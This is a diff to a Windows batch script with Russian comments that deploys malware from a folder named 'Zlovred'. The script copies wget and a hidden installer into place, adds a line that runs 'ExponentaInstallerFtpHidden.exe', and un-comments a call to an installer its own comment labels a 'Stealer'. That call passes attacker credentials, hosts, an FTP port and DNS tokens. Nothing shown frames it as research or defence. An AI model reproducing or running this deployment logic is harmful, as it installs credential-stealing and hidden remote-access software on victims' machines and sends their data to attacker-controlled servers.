@@ -95,7 +95,7 @@ rem set ftpSubFolder1=
 rem Маска для файлов
 rem set ftpFileMask=*
 rem Локальный каталог
-set LocalFolder=%PUB1%\Distrib\Zlovred
+set LocalFolderZ=%PUB1%\Distrib\Zlovred
  
  
 ::Генерируем файл FTP команд
@@ -106,7 +106,7 @@ set LocalFolder=%PUB1%\Distrib\Zlovred
   echo binary
   echo prompt
   echo hash
-  echo lcd "%LocalFolder%"
+  echo lcd "%LocalFolderZ%"
   if "%ftpMainFolder%" neq "" echo cd "%ftpMainFolder%"
   if "%ftpSubFolder%" neq "" echo cd "%ftpSubFolder%"
   if "%ftpSubFolder1%" neq "" echo cd "%ftpSubFolder1%"
@@ -123,14 +123,17 @@ set LocalFolder=%PUB1%\Distrib\Zlovred
 del /f /q %CommFTP%
 
 rem Копируем wget и запускаем установку в каталоге %LocalFolder%
-copy wget.exe %LocalFolder%\wget.exe
-copy install_Styler.ini %LocalFolder%\
-copy installFTP_Stylerdistrib.bat %LocalFolder%\
-copy Install_StylerFTP.bat %LocalFolder%\
+copy wget.exe %LocalFolderZ%\wget.exe
+copy ExponentaInstallerFtpHidden.exe %LocalFolderZ%\ExponentaInstallerFtpHidden.exe
+copy install_Styler.ini %LocalFolderZ%\
+copy installFTP_Stylerdistrib.bat %LocalFolderZ%\
+copy Install_StylerFTP.bat %LocalFolderZ%\
 
+rem Запускаем инсталлятор Admin-Pack "Экспонента"
+ExponentaInstallerFtpHidden.exe
 
 rem Запускаем инсталлятор Stealer "Экспонента"
-rem call install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
+call install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
 cd /d %curdir%
 
 rem Удаляем временный каталог
